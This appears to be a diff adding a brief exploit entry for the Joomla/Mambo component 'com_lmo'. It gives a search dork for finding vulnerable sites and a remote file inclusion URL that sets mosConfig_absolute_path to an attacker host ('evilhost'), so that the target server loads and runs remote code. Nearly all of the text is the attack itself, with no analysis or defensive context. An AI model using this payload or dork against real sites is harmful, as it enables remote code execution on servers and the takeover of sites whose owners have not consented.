@@ -1,0 +1,6 @@
+Exploit:
+~~~~~~~~
+
+dork: "com_lmo"
+
+http://www.vuln.com/components/com_lmo/lmo.php?mosConfig_absolute_path=http://evilhost
